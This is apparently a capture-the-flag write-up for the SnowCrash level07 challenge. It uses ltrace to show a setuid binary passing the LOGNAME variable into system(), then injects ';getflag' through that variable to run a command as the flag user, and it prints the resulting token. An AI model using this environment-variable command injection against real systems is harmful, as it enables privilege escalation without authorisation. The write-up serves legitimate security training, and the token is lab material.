# Level07

When logging in to level07, a level07 binary can be found in the home directory

```bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

When running the binary into `ltrace`, we can see the binary is using `system(3)`, which can be easily exploitable, and a `getenv()` call on the `LOGNAME` variable

```bash
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7c4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                     = 2007
geteuid()                                                                                                     = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0
getenv("LOGNAME")                                                                                             = "level07"
asprintf(0xbffff714, 0x8048688, 0xbfffff4c, 0xb7e5ee55, 0xb7fed280)                                           = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                        = 0
+++ exited (status 0) +++
```

When trying to modify the content of the `LOGNAME` variable, we can see the program also changes it's output, we know the program is running `/bin/echo` on `LOGNAME`.

At this point, we can easily guess how to run the `getflag` command in the `system(3)` call

```bash
level07@SnowCrash:~$ env LOGNAME=';getflag' ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
